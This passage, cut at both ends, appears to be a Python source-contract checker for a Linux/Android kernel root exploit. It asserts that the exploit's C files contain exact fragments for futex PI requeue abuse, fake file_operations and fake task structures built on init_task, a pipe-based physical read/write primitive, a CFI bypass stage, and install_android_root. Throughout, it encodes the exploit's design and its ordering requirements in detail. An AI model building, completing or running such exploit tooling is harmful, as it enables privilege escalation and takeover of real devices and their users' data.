    if len(mode4_blocks) != 1:
        errors.append("util has no unique finalized pselect mode4 block")
    else:
        mode4 = mode4_blocks[0]
        for needle in (
            "pselect_custom_target != misc_fops",
            "pselect_custom_value != fake_fops",
            "fake_parent = fake_fops",
            "fake_right = misc_fops",
            "fake_left = 0",
        ):
            if needle not in mode4:
                errors.append(f"util finalized mode4 block omits {needle!r}")
        if "pselect_custom_target - 8" in mode4 or "fake_right = fake_fops" in mode4:
            errors.append("util mode4 regressed to the owner-clobbering generic shape")
    if "fops mode4 hybrid owner-safe" not in util:
        errors.append("util omits the owner-safe mode4 compiled marker")

    ordered_source_contract(
        coordinator,
        [
            "futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI",
            "for (;;)",
            "atomic_load_explicit(&pi_cleanup_fail_stop_active, memory_order_acquire)",
            "prctl(PR_SET_PDEATHSIG, 0",
            "pthread_sigmask(SIG_BLOCK",
            "PI_CLEANUP_FAIL_STOP process leader parked; route_done",
            "pause()",
            "if (atomic_load(&route_done))",
            "atomic_exchange(&pipe_prepare_request, 0)",
            'pr_info("pipe prepare request accepted\\n")',
            "pipebuf_page_base = prepare_pipe_buffer_page()",
            "atomic_store(&pipe_prepare_done, 1)",
        ],
        "pipe prepare coordinator handoff",
        errors,
    )
    pipe_callgraph_functions = (
        "init_ctx",
        "resize_pipe_slots",
        "make_pipe_object",
        "alloc_pipe_object",
        "free_pipe_object",
        "shape_pipe_cache_once",
        "shape_pipe_cache",
        "prepare_pipe_buffer_page_child",
        "prepare_pipe_buffer_page",
        "install_pipe_physrw",
    )
    pipe_callgraph_bodies = {
        name: c_function_body(pipe, name) for name in pipe_callgraph_functions
    }
    missing_pipe_bodies = [
        name for name, body in pipe_callgraph_bodies.items() if not body
    ]
    for name in missing_pipe_bodies:
        errors.append(f"pipe prepare callgraph body is not inspectable: {name}")
    pipe_callgraph = " ".join(pipe_callgraph_bodies.values())
    for forbidden in ("SYSCHK(", "pr_error(", "exit(", "_exit(", "abort("):
        if forbidden in pipe_callgraph:
            errors.append(f"pipe prepare/install callgraph contains fatal token {forbidden!r}")
    checked_ops = (
        "pipe(",
        "fcntl(",
        "socketpair(",
        "sendmsg(",
        "write(",
        "read(",
        "close(",
        "fork(",
        "waitpid(",
        "malloc(",
        "calloc(",
    )
    for op in checked_ops:
        search_from = 0
        while True:
            position = pipe_callgraph.find(op, search_from)
            if position < 0:
                break
            statement = source_statement_around(pipe_callgraph, position)
            if not checked_call_statement(statement, op):
                errors.append(f"pipe prepare/install unchecked operation {op!r}: {statement!r}")
                break
            search_from = position + len(op)
    prepare_pipe = pipe_callgraph_bodies.get("prepare_pipe_buffer_page", "")
    install_pipe = pipe_callgraph_bodies.get("install_pipe_physrw", "")
    prepare_call_pos = coordinator.find("pipebuf_page_base = prepare_pipe_buffer_page()")
    prepare_done_pos = coordinator.find("atomic_store(&pipe_prepare_done, 1)", prepare_call_pos)
    if prepare_call_pos < 0 or prepare_done_pos < 0:
        errors.append("pipe prepare coordinator does not publish done after prepare call")
    elif "if (pipebuf_page_base" in coordinator[prepare_call_pos:prepare_done_pos]:
        errors.append("pipe prepare coordinator withholds done on base0")
    if "if (pipebuf_page_base == 0) { return 0; }" not in install_pipe:
        errors.append("install_pipe_physrw does not reject base0 after prepare completion")
    ordered_source_contract(
        install_pipe,
        [
            "while (!atomic_load(&pipe_prepare_done))",
            "if (pipebuf_page_base == 0) { return 0; }",
            "char marker[PIPE_RECLAIM]",
            "write(pipe_fds_reclaim[i][1], marker, i + 1)",
            "wrote != (ssize_t)(i + 1)",
            "return 0",
        ],
        "pipe reclaim marker write nonfatal readback",
        errors,
    )
    route_create_pos = coordinator.find("pthread_create")
    sigpipe_pos = coordinator.find("SIGPIPE")
    if route_create_pos < 0 or sigpipe_pos < 0 or sigpipe_pos > route_create_pos:
        errors.append("route thread signal setup does not block/ignore SIGPIPE before pthread_create")

    fake_fops_table = c_function_body(normalized.get("util", ""), "put_fake_fops_table")
    for needle in (
        "put64(p, off + FOPS_OWNER_OFF, 0)",
        "put64(p, off + FOPS_READ_OFF, 0)",
    ):
        if needle not in fake_fops_table:
            errors.append(f"fake fops table omits exact case1 precondition {needle!r}")

    pi_tail = util[util.find("FAKE_TASK_PI_LOCK_OFF") :]
    pi_tail = pi_tail[: pi_tail.find("FAKE_TASK_TASK_GROUP_OFF")]
    root_zero = "put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0)"
    leftmost_zero = (
        "put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0)"
    )
    if root_zero not in pi_tail or leftmost_zero not in pi_tail:
        errors.append("fake task does not unconditionally zero cached root and leftmost")
    if "fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF" in pi_tail:
        errors.append("fake task links W0 into rb root/leftmost (rb_next hazard)")

    donor_requirements = (
        "uint64_t waiter_task = text_addr(INIT_TASK)",
        "uint64_t pi_top_task = text_addr(INIT_TASK)",
        "put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task)",
        "put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task)",
    )
    for needle in donor_requirements:
        if needle not in util:
            errors.append(f"util donor/pi_top contract omits {needle!r}")
    fdsets = c_function_body(fops, "prepare_pselect_fdsets")
    if '{12, text_addr(INIT_TASK), "task"}' not in fdsets:
        errors.append("pselect stack waiter donor is not canonical init_task")
    if "fake_task" in fdsets or "data_addr(INIT_TASK)" in fdsets:
        errors.append("pselect stack waiter uses a fake/direct-map donor")

    shift = c_function_body(fops, "pselect_waiter_shift")
    simple = c_function_body(fops, "pselect_simple_layout")
    if "return PSELECT_WAITER_WORD_SHIFT" not in shift:
        errors.append("Pad 3 pselect shift is not compile-time exact")
    if "return 0" not in simple:
        errors.append("Pad 3 simple-layout route is not compile-time disabled")
    if '"PSELECT_SHIFT"' in shift or '"PSELECT_SIMPLE_LAYOUT"' in simple:
        errors.append("Pad 3 layout helper permits a runtime override")
    route_delay = c_function_body(fops, "route_delay_usec")
    if "pselect_custom_write_enabled()" not in route_delay:
        errors.append("pselect route delay no longer distinguishes custom writes")
    if "PSELECT_ENTER_DELAY_USEC" not in route_delay:
        errors.append("custom pselect route can enter sched_setattr before select copies fdsets")

    waiter = c_function_body(main, "waiter_thread")
    ordered_source_contract(
        waiter,
        [
            "FUTEX_WAIT_REQUEUE_PI",
            "futex_op(&f_pi_chain, FUTEX_UNLOCK_PI",
            "while (!atomic_load(&owner_chain_done))",
            "do_pselect_fake_lock_route()",
        ],
        "waiter early f_pi_chain unlock",
        errors,
    )
    consumer = c_function_body(main, "consumer_thread")
    ordered_source_contract(
        consumer,
        [
            "atomic_store(&consumer_inflight, 1)",
            "sched_setattr_tid(tid, PSELECT_CONSUMER_NICE)",
            "atomic_store(&consumer_inflight, 0)",
        ],
        "consumer in-flight publication",
        errors,
    )
    ack_release = "atomic_store_explicit(&consumer_quiesced_seq, seq, memory_order_release)"
    ack_pos = consumer.find(ack_release)
    final_inflight0 = source_rfind_any(
        consumer,
        (
            "atomic_store(&consumer_inflight, 0)",
            "atomic_store_explicit(&consumer_inflight, 0, memory_order_release)",
        ),
        ack_pos if ack_pos >= 0 else len(consumer),
    )
    final_go_changed = source_rfind_any(
        consumer,
        (
            "atomic_load(&punch_consume_go) != seq",
            "atomic_load_explicit(&punch_consume_go, memory_order_acquire) != seq",
        ),
        ack_pos if ack_pos >= 0 else len(consumer),
    )
    ack_order = [final_inflight0, final_go_changed, ack_pos]
    if any(position < 0 for position in ack_order) or ack_order != sorted(ack_order):
        errors.append(
            "consumer quiescence ack is not published after inflight=0 and go!=seq"
        )

    route_body = c_function_body(fops, "do_pselect_fake_lock_route")
    for needle in (
        'getenv("PSELECT_SHIFT")',
        'getenv("PSELECT_SIMPLE_LAYOUT")',
        "cfi_last_step = 36",
        "cfi_last_errno = EINVAL",
        "exact target rejects runtime pselect layout overrides",
    ):
        if needle not in route_body:
            errors.append(f"runtime layout override rejection omits {needle!r}")
    if not re.search(
        r"route_signal\s*=\s*custom_mode\s*==\s*4\s*\?\s*"
        r"calls\s*>\s*0\s*:\s*calls\s*>\s*0\s*&&\s*success\s*>\s*0",
        route_body,
    ):
        errors.append(
            "mode4 mutation receipt incorrectly depends on consumer_success"
        )
    select_pos = route_body.find("select(PSELECT_ROUTE_NFDS")
    go_zero = source_find_any(
        route_body,
        (
            "atomic_store(&punch_consume_go, 0)",
            "atomic_store_explicit(&punch_consume_go, 0, memory_order_release)",
        ),
        select_pos,
    )
    inflight_wait = source_find_any(
        route_body,
        (
            "while (atomic_load(&consumer_inflight)",
            "while (atomic_load_explicit(&consumer_inflight, memory_order_acquire)",
        ),
        go_zero,
    )
    ack_wait = route_body.find(
        "acknowledged_seq = atomic_load_explicit(&consumer_quiesced_seq, memory_order_acquire)",
        inflight_wait,
    )
    consumer_quiesced_calc = source_find_any(
        route_body,
        (
            "int consumer_quiesced = !atomic_load(&consumer_inflight)",
            "int consumer_quiesced = !atomic_load_explicit(&consumer_inflight, memory_order_acquire)",
        ),
        inflight_wait,
    )
    route_signal_gate = source_find_any(
        route_body,
        (
            "if (route_signal && !atomic_load(&consumer_inflight))",
            "if (route_signal && !atomic_load_explicit(&consumer_inflight, memory_order_acquire))",
            "if (route_signal && consumer_quiesced)",
        ),
        consumer_quiesced_calc,
    )
    if min(select_pos, go_zero, inflight_wait, ack_wait, consumer_quiesced_calc, route_signal_gate) < 0:
        errors.append("pselect return lacks the exact consumer-inflight zero gate")
    elif [select_pos, go_zero, inflight_wait, ack_wait, consumer_quiesced_calc, route_signal_gate] != sorted(
        [select_pos, go_zero, inflight_wait, ack_wait, consumer_quiesced_calc, route_signal_gate]
    ):
        errors.append("pselect consumer-inflight gate is out of order")

    go_start = source_find_any(
        route_body,
        (
            "atomic_store(&punch_consume_go, route_attempt)",
            "atomic_store_explicit(&punch_consume_go, route_attempt, memory_order_release)",
        ),
    )
    mode4_state_tokens = [
        route_body.find("if (custom_mode == 4)"),
        source_find_any(
            route_body,
            (
                "atomic_store(&pi_cleanup_required, 1)",
                "atomic_store_explicit(&pi_cleanup_required, 1, memory_order_release)",
            ),
        ),
        source_find_any(
            route_body,
            (
                "atomic_store(&pi_cleanup_seq, route_attempt)",
                "atomic_store_explicit(&pi_cleanup_seq, route_attempt, memory_order_release)",
            ),
        ),
        go_start,
    ]
    if any(position < 0 for position in mode4_state_tokens) or mode4_state_tokens != sorted(
        mode4_state_tokens
    ):
        errors.append("mode4 does not arm PI cleanup required+seq before publishing go")
    ack_acquire = route_body.find(
        "atomic_load_explicit(&consumer_quiesced_seq, memory_order_acquire)",
        go_zero,
    )
    if ack_acquire < 0 or ack_wait < 0 or consumer_quiesced_calc < 0 or (
        route_signal_gate >= 0 and max(ack_acquire, ack_wait, consumer_quiesced_calc) > route_signal_gate
    ):
        errors.append("pselect producer does not acquire consumer quiescence ack before route signal")

    mode4_dispatch = route_body.find("if (custom_mode == 4)")
    mode4_stage = route_body.find("if (try_cfi_stage())", mode4_dispatch)
    blind_modes = route_body.find("else if (custom_mode)", mode4_stage)
    blind_success = route_body.find("route_verified = 1", blind_modes)
    if min(mode4_dispatch, mode4_stage, blind_modes, blind_success) < 0:
        errors.append("mode4 does not have an explicit non-blind CFI dispatch")
    elif [mode4_dispatch, mode4_stage, blind_modes, blind_success] != sorted(
        [mode4_dispatch, mode4_stage, blind_modes, blind_success]
    ):
        errors.append("mode4 CFI dispatch occurs after the blind custom-write branch")

    repair = c_function_body(fops, "repair_fake_fops_llseek")
    for needle in (
        "uint64_t llseek = text_addr(NOOP_LLSEEK)",
        "fake_fops + FOPS_LLSEEK_OFF",
        "configfs_write_once(fd, slot, &llseek, sizeof(llseek))",
        "configfs_read_once(fd, slot, &after, sizeof(after))",
        "after == llseek",
    ):
        if needle not in repair:
            errors.append(f"fake_fops llseek repair omits {needle!r}")

    cleanup = c_function_body(root, "cleanup_main_waiter_pi_state")
    retry_helper = c_function_body(root, "root_a2_snapshot_current_retry")
    a3_stage = c_function_body(root, "install_stopped_child_root")
    stage = c_function_body(fops, "try_cfi_stage")
    fail_stop = c_function_body(root, "pi_cleanup_fail_stop")
    signal_helper = c_function_body(main, "block_pi_cleanup_termination_signals")
    dirty_retain = c_function_body(preload, "retain_current_boot_dirty_child")
    preload_supervise = c_function_body(preload, "supervise")
    publish_dirty = c_function_body(preload, "payload_publish_primitive_dirty")
    function_bodies: dict[str, str] = {}
    for source_text in (util_source, fops, pipe, main, root):
        function_bodies.update(c_function_definitions(source_text))
    coordinator_prepare_blocks = [
        block
        for block in c_if_blocks(
            coordinator, r"atomic_exchange\(&pipe_prepare_request,\s*0\)"
        )
        if "prepare_pipe_buffer_page()" in block
    ]
    if len(coordinator_prepare_blocks) != 1:
        errors.append("coordinator pipe prepare block is not uniquely inspectable")
    else:
        function_bodies["coordinator_prepare_pipe"] = coordinator_prepare_blocks[0]
    closure_roots = [
        "consumer_thread",
        "try_cfi_stage",
        "install_child_root",
        "install_pipe_physrw",
        "validate_kernel_phys_load",
        "validate_runtime_kernel_phys_variables",
        "cleanup_main_waiter_pi_state",
        "pi_cleanup_fail_stop",
        "install_android_root",
        "install_stopped_child_root",
        "root_a3_commit_helper",
        "root_a3_abort_helper",
        "prepare_pipe_buffer_page",
        "coordinator_prepare_pipe",
    ]
    fork_child_only = {
        "pipe_prepare_child_process",
        "child_main",
        "root_a3_pipe_guard_main",
        "root_a3_watchdog_main",
        "root_a3_watchdog_restore_and_exit",
        "root_a3_exec_sealed_helper_now",
        "root_a3_child_fail",
        "root_a3_child_main",
    }
    for root_name in closure_roots:
        if root_name not in function_bodies:
            errors.append(f"post-required fatal-free root is not inspectable: {root_name}")
    post_required_closure = c_direct_call_closure(
        function_bodies, closure_roots, fork_child_only
    )
    for func_name, body in sorted(post_required_closure.items()):
        scan_body = c_remove_if_blocks(
            body, r"(?:child|result)\s*==\s*0"
        )
        scan_body = c_remove_if_blocks(scan_body, r"result\s*==\s*0")
        for forbidden in ("SYSCHK(", "pr_error(", "exit(", "_exit(", "abort("):
            if source_has_forbidden_call(scan_body, forbidden):
                errors.append(
                    f"post-required parent/waiter closure {func_name} contains fatal token {forbidden!r}"
                )
    cleanup_needles = (
        "struct waiter_pi_snapshot",
        "atomic_load(&route_done) != 0",
        "atomic_load(&pi_cleanup_required) != 1",
        "atomic_load(&pi_cleanup_done) != 0",
        "atomic_load(&pi_cleanup_seq) != atomic_load_explicit(&consumer_quiesced_seq, memory_order_acquire)",
        "root_a2_snapshot_current_retry(fd, &current)",
        "waiter PI cleanup cached",
        "READ_WAITER_PI_SNAPSHOT(first)",
        "READ_WAITER_PI_SNAPSHOT(second)",
        "memcmp(&first, &second, sizeof(first)) != 0",
        "first.pi_lock != 0",
        "first.pi_root != 0",
        "first.pi_leftmost != 0",
        "first.pi_top != 0",
        "root_a2_read64(fd, current.task + TASK_STACK_OFF",
        "!is_kernel_ptr((uintptr_t)first.stack)",
        "(first.stack & (TASK_THREAD_SIZE - 1)) != 0",
        "!is_kernel_ptr((uintptr_t)first.blocked_on)",
        "(first.blocked_on & 7) != 0",
        "first.blocked_on < first.stack",
        "first.stack + TASK_THREAD_SIZE - RT_MUTEX_WAITER_SIZE",
        "atomic_load(&consumer_inflight)",
        "blocked_addr = current.task + FAKE_TASK_PI_BLOCKED_ON_OFF",
        "root_a2_write_readback(fd, blocked_addr, &zero, sizeof(zero))",
        "READ_WAITER_PI_SNAPSHOT(after)",
        "after.stack != first.stack",
        "after.pi_lock != 0",
        "after.pi_root != 0",
        "after.pi_leftmost != 0",
        "after.pi_top != 0",
        "after.blocked_on != 0",
        "waiter PI cleanup exact",
    )
    for needle in cleanup_needles:
        if needle not in cleanup:
            errors.append(f"waiter PI cleanup omits {needle!r}")
    if cleanup.count("root_a2_write_readback(") != 1:
        errors.append("waiter PI cleanup must issue exactly one zero-only write")
    if not retry_helper:
        errors.append("root omits bounded root_a2_snapshot_current_retry helper")
    else:
        for needle in (
            "ROOT_A2_SNAPSHOT_RETRY_ATTEMPTS",
            "ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS",
            "root_a2_snapshot_current(fd, snapshot)",
            "pipe_restore_unknown",
            "|| pipe_restore_unknown || !ROOT_A2_RETRY_GATE_STABLE()) { break; }",
            "pipe_restore_unknown || !ROOT_A2_RETRY_GATE_STABLE()) { break; }",
            "atomic_load(&consumer_inflight)",
            "atomic_load(&punch_consume_go)",
            "atomic_load(&pi_cleanup_required)",
            "atomic_load(&pi_cleanup_done)",
            "atomic_load(&pi_cleanup_seq)",
        ):
            if needle not in retry_helper:
                errors.append(f"snapshot retry helper omits {needle!r}")
        for write_token in (
            "root_a2_write",
            "pipe_phys_write",
            "kernel_write",
            "configfs_write",
        ):
            if write_token in retry_helper:
                errors.append("snapshot retry helper performs a write before cleanup")
                break
        if retry_helper.count("pipe_restore_unknown") < 2:
            errors.append("snapshot retry helper does not abort on pipe restore dirty before and after a read")
        if retry_helper.count("ROOT_A2_RETRY_GATE_STABLE") < 3:
            errors.append("snapshot retry helper does not abort on cleanup gate changes around a read")
        exact_pos = retry_helper.find("root_a2_snapshot_current(fd, snapshot)")
        accept_pos = retry_helper.find("if (exact)", exact_pos)
        post_call_window = (
            retry_helper[exact_pos:accept_pos]
            if exact_pos >= 0 and accept_pos >= 0
            else ""
        )
        if (
            "root_a2_monotonic_ms()" not in post_call_window
            or "ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS" not in post_call_window
        ):
            errors.append("snapshot exact acceptance lacks post-call <=500ms deadline gate")
    if "root_a2_snapshot_current_retry(fd, &parent)" not in a3_stage:
        errors.append("A3 preflight does not use the bounded current-task snapshot retry helper")
    if "root_a2_snapshot_current(fd, &parent)" in a3_stage:
        errors.append("A3 preflight still calls the single-shot current-task snapshot")
    combined_pi_sources = " ".join((main, fops, root))
    if "__attribute__((noreturn))" not in combined_pi_sources or "pi_cleanup_fail_stop" not in combined_pi_sources:
        errors.append("PI cleanup fail-stop is not marked non-returning")
    if "pr_error" not in utils_raw or "exit(-1)" not in utils_raw:
        errors.append("utils.h no longer proves pr_error is process-fatal")
    if not fail_stop:
        errors.append("PI cleanup fail-stop body is not inspectable")
    else:
        for forbidden in ("pr_error(", "exit(", "_exit(", "abort(", "raise(", "kill("):
            if forbidden in fail_stop:
                errors.append(f"PI cleanup fail-stop body contains fatal token {forbidden!r}")
        if not source_has_any(
            fail_stop,
            (
                "fprintf(stderr,",
                "dprintf(STDERR_FILENO,",
                "write(STDERR_FILENO,",
                "write(2,",
                "syscall(SYS_write, STDERR_FILENO",
            ),
        ):
            errors.append("PI cleanup fail-stop does not use a nonfatal raw log")
        if (
            "atomic_store_explicit" not in fail_stop
            or "memory_order_release" not in fail_stop
            or "active" not in fail_stop
        ):
            errors.append("PI cleanup fail-stop does not publish active state with release semantics")
        if "PR_SET_PDEATHSIG, 0" not in fail_stop:
            errors.append("PI cleanup fail-stop does not clear PDEATHSIG before parking")
        fail_stop_signal_source = fail_stop + " " + signal_helper
        if not source_has_any(
            fail_stop_signal_source,
            ("pthread_sigmask(SIG_BLOCK", "sigprocmask(SIG_BLOCK"),
        ):
            errors.append("PI cleanup fail-stop does not block terminating signals")
        for signal in ("SIGTERM", "SIGHUP", "SIGINT", "SIGQUIT"):
            if signal not in fail_stop_signal_source:
                errors.append(f"PI cleanup fail-stop park does not block {signal}")
        if "for (;;)" not in fail_stop or not source_has_any(
            fail_stop, ("pause()", "pause(", "sigsuspend(", "sleep(")
        ):
            errors.append("PI cleanup fail-stop does not use a noreturn park loop")
        if "return" in fail_stop:
            errors.append("PI cleanup fail-stop body contains a return path")
    route_create = coordinator.find("pthread_create")
    route_block = source_find_any(
        coordinator,
        (
            "pthread_sigmask(SIG_BLOCK",
            "sigprocmask(SIG_BLOCK",
            "block_pi_cleanup_termination_signals(&old_signal_mask)",
        ),
    )
    if route_create < 0 or route_block < 0 or route_block > route_create:
        errors.append("route threads do not inherit a terminating-signal block before pthread_create")
    route_signal_source = coordinator + " " + signal_helper
    for signal in ("SIGTERM", "SIGHUP", "SIGINT", "SIGQUIT"):
        signal_pos = route_signal_source.find(signal)
        if signal_pos < 0:
            errors.append(f"route thread inherited mask omits {signal}")
    active_pos = source_find_any(
        coordinator,
        (
            "atomic_load_explicit(&pi_cleanup_fail_stop_active, memory_order_acquire)",
            "atomic_load_explicit(&pi_cleanup_active, memory_order_acquire)",
        ),
    )
    route_done_pos = coordinator.find("atomic_load(&route_done)")
    if active_pos < 0 or route_done_pos < 0 or active_pos > route_done_pos:
        errors.append("route coordinator does not check fail-stop active before route_done")
    coordinator_park = (
        coordinator[active_pos:route_done_pos]
        if active_pos >= 0 and route_done_pos >= 0 and active_pos < route_done_pos
        else ""
    )
    if "PR_SET_PDEATHSIG, 0" not in coordinator_park:
        errors.append("route coordinator does not clear PDEATHSIG when fail-stop is active")
    if "for (;;)" not in coordinator_park or not source_has_any(
        coordinator_park, ("pause()", "pause(", "sigsuspend(", "sleep(")
    ):
        errors.append("route coordinator does not park before route_done when fail-stop is active")
    fail_stop_waiter = [
        waiter.find("do_pselect_fake_lock_route()"),
        waiter.find("pi_cleanup_fail_stop"),
        waiter.find("atomic_store(&route_done, 1)"),
    ]
    if any(position < 0 for position in fail_stop_waiter) or fail_stop_waiter != sorted(
        fail_stop_waiter
    ):
        errors.append("waiter can publish route_done before the stale-PI fail-stop gate")
    if "pi_cleanup_fail_stop(fd)" not in stage:
        errors.append("try_cfi_stage does not fail-stop with the configfs fd held")
    direct_restore = stage.find(
        "if (!restore_cfi_redirect_exact(fd, misc_fops, original_fops))"
    )
    commit_decl = stage.find("int commit_result", direct_restore)
    direct_restore_block = (
        stage[direct_restore:commit_decl]
        if direct_restore >= 0 and commit_decl >= 0
        else ""
    )
    if "pi_cleanup_fail_stop(fd)" not in direct_restore_block:
        errors.append("try_cfi_stage does not fail-stop on redirect restore failure")
    for forbidden in ("goto close_unknown", "close(fd)", "return 0"):
        if forbidden in direct_restore_block:
            errors.append(f"try_cfi_stage redirect-restore failure can {forbidden!r}")
    commit_negative = stage.find("commit_result < 0", commit_decl)
    commit_negative_block = (
        stage[commit_negative : stage.find("}", commit_negative) + 1]
        if commit_negative >= 0
        else ""
    )
    if commit_negative < 0 or "pi_cleanup_fail_stop(fd)" not in commit_negative_block:
        errors.append("try_cfi_stage does not fail-stop on negative A3 commit result")
    fail_label = stage.find("fail:")
    close_unknown_label = stage.find("close_unknown:", fail_label)
    if fail_label >= 0 and close_unknown_label >= 0:
        fail_block = stage[fail_label:close_unknown_label]
    elif fail_label >= 0:
        fail_block = stage[fail_label:]
    else:
        fail_block = ""
    unknown_gate = source_find_any(
        fail_block,
        (
            "!redirect_restored || pipe_restore_unknown || abort_ok != 1 || auxiliary_dirty_unknown",
            "abort_ok != 1 || !redirect_restored || pipe_restore_unknown || auxiliary_dirty_unknown",
        ),
    )
    unknown_fail_stop = fail_block.find("pi_cleanup_fail_stop(fd)", unknown_gate)
    if unknown_gate < 0 or unknown_fail_stop < 0:
        errors.append("try_cfi_stage does not fail-stop on dirty-unknown abort/restore state")
    close_unknown_block = stage[close_unknown_label:] if close_unknown_label >= 0 else ""
    unknown_fail_stop_pos = close_unknown_block.find("pi_cleanup_fail_stop(fd)")
    close_pos = close_unknown_block.find("close(fd)")
    return_pos = close_unknown_block.find("return 0")
    if close_unknown_label >= 0 and (
        (close_pos >= 0 and (unknown_fail_stop_pos < 0 or close_pos < unknown_fail_stop_pos))
        or (return_pos >= 0 and (unknown_fail_stop_pos < 0 or return_pos < unknown_fail_stop_pos))
    ):
        errors.append("try_cfi_stage can close/return from a dirty-unknown path")
    if not publish_dirty:
        errors.append("payload_publish_primitive_dirty body is not inspectable")
    else:
        dirty_store_pos = publish_dirty.find(
            "atomic_store_explicit(&payload_state->dirty, 1, memory_order_release)"
        )
        leader_getpid_pos = publish_dirty.find("pid_t process_id = getpid()")
        leader_gettid_pos = publish_dirty.find(
            "pid_t thread_id = (pid_t)syscall(SYS_gettid)"
        )
        leader_gate_pos = publish_dirty.find("process_id != thread_id")
        pdeath_pos = publish_dirty.find("PR_SET_PDEATHSIG, 0")
        marker_open_pos = publish_dirty.find("open(marker_path")
        marker_success_pos = publish_dirty.find("atomic_store(&primitive_marker_ready, 1)")
        first_success_pos = publish_dirty.find("return 1")
        for label, position in (
            ("release dirty store", dirty_store_pos),
            ("process leader getpid", leader_getpid_pos),
            ("process leader gettid", leader_gettid_pos),
            ("process leader rejection", leader_gate_pos),
            ("PDEATHSIG clear", pdeath_pos),
            ("marker success publish", marker_success_pos),
        ):
            if position < 0:
                errors.append(f"payload_publish_primitive_dirty omits {label}")
        leader_blocks = c_if_blocks(publish_dirty, r"process_id\s*!=\s*thread_id")
        if len(leader_blocks) != 1 or "return 0" not in leader_blocks[0]:
            errors.append("payload_publish_primitive_dirty does not reject non-leader with return 0")
        pdeath_blocks = c_if_blocks(
            publish_dirty,
            r"prctl\(PR_SET_PDEATHSIG,\s*0,\s*0,\s*0,\s*0\)\s*!=\s*0",
        )
        if len(pdeath_blocks) != 1 or "return 0" not in pdeath_blocks[0]:
            errors.append("payload_publish_primitive_dirty PDEATHSIG failure does not return 0")
        if (
            pdeath_pos >= 0
            and marker_open_pos >= 0
            and pdeath_pos > marker_open_pos
        ):
            errors.append("payload_publish_primitive_dirty clears PDEATHSIG after marker route starts")
        if (
            pdeath_pos >= 0
            and marker_success_pos >= 0
            and pdeath_pos > marker_success_pos
        ):
            errors.append("payload_publish_primitive_dirty clears PDEATHSIG after marker success publish")
        if (
            pdeath_pos >= 0
            and first_success_pos >= 0
            and first_success_pos < pdeath_pos
        ):
            errors.append("payload_publish_primitive_dirty can return success before PDEATHSIG clear")
        if (
            leader_gate_pos >= 0
            and marker_open_pos >= 0
            and leader_gate_pos > marker_open_pos
        ):
            errors.append("payload_publish_primitive_dirty checks process leader after marker route starts")
        for forbidden in ("SYSCHK(", "exit(", "_exit(", "abort(", "raise(", "kill("):
            if forbidden in publish_dirty:
                errors.append(f"payload_publish_primitive_dirty contains fatal token {forbidden!r}")

    dirty_signal_helper = c_function_body(preload, "block_dirty_retention_signals")
    first_supervisor_fork = preload_supervise.find("fork()")
    pre_fork_supervisor = (
        preload_supervise[:first_supervisor_fork]
        if first_supervisor_fork >= 0
        else ""
    )
    if first_supervisor_fork < 0:
        errors.append("preload supervisor fork point is not inspectable")
    elif "block_dirty_retention_signals()" not in pre_fork_supervisor:
        errors.append("preload supervisor does not block dirty-retention signals before fork")
    supervisor_signal_source = pre_fork_supervisor + " " + dirty_signal_helper
    if not source_has_any(
        supervisor_signal_source,
        ("pthread_sigmask(SIG_BLOCK", "sigprocmask(SIG_BLOCK"),
    ):
        errors.append("preload supervisor signal block does not install a blocking mask")
    for signal in ("SIGTERM", "SIGHUP", "SIGINT", "SIGQUIT", "SIGPIPE"):
        add_token = f"sigaddset(&blocked_signals, {signal})"
        if add_token not in dirty_signal_helper:
            errors.append(f"preload supervisor dirty-retention mask omits {signal}")

    timeout_blocks = [
        block
        for block in c_if_blocks(preload_supervise, r"elapsed\s*>=\s*timeout_sec")
        if "timeout child" in block
    ]
    if len(timeout_blocks) != 1:
        errors.append("preload supervisor timeout branch is not uniquely inspectable")
    else:
        timeout_block = timeout_blocks[0]
        for forbidden in (
            "kill(",
            "terminate_clean_attempt(",
            "SIGKILL)",
            "SIGKILL,",
            "pr_error(",
            "exit(",
            "_exit(",
            "abort(",
            "raise(",
        ):
            if forbidden in timeout_block:
                errors.append(f"preload dirty timeout branch contains fatal token {forbidden!r}")
        timeout_dirty_pos = source_find_any(
            timeout_block,
            (
                "atomic_load(&payload_state->dirty)",
                "atomic_load_explicit(&payload_state->dirty, memory_order_acquire)",
            ),
        )
        timeout_retain_pos = timeout_block.find(
            "retain_current_boot_dirty_child(child, 0)", timeout_dirty_pos
        )
        if timeout_dirty_pos < 0 or timeout_retain_pos < 0:
            errors.append("preload dirty timeout does not retain immediately after dirty snapshot")
        if timeout_block.count("retain_current_boot_dirty_child(child, 0)") < 2:
            errors.append("preload timeout does not unconditionally retain the live child")

    dirty_blocks = c_if_blocks(
        preload,
        r"atomic_load_explicit\(&payload_state->dirty,\s*memory_order_acquire\)",
    )
    if len(dirty_blocks) != 1:
        errors.append("preload has no unique dirty supervisor retention branch")
    else:
        dirty_branch = dirty_blocks[0]
        if "retain_current_boot_dirty_child(child, 0)" in dirty_branch:
            dirty_branch = dirty_retain
        for forbidden in (
            "pr_error(",
            "kill(",
            "terminate_clean_attempt(",
            "SIGKILL)",
            "SIGKILL,",
            "exit(",
            "_exit(",
            "abort(",
            "raise(",
        ):
            if forbidden in dirty_branch:
                errors.append(
                    f"dirty supervisor retention branch contains fatal token {forbidden!r}"
                )
        if not source_has_any(
            dirty_branch,
            (
                "CURRENT_BOOT_DIRTY_RETAIN",
                "current-boot dirty supervisor timeout no SIGKILL",
            ),
        ):
            errors.append("dirty supervisor retention helper lacks a nonfatal raw log marker")
        first_dirty_log = source_find_any(
            dirty_branch, ("dprintf(STDERR_FILENO", "fprintf(stderr")
        )
        if not source_has_any(
            dirty_branch,
            ("pthread_sigmask(SIG_BLOCK", "sigprocmask(SIG_BLOCK"),
        ):
            errors.append("dirty supervisor retention helper does not install a blocking mask")
        for signal in ("SIGTERM", "SIGHUP", "SIGINT", "SIGQUIT", "SIGPIPE"):
            add_token = f"sigaddset(&blocked_signals, {signal})"
            signal_pos = dirty_branch.find(signal)
            if add_token not in dirty_branch:
                errors.append(f"dirty supervisor retention helper omits {signal}")
            elif first_dirty_log >= 0 and signal_pos > first_dirty_log:
                errors.append(
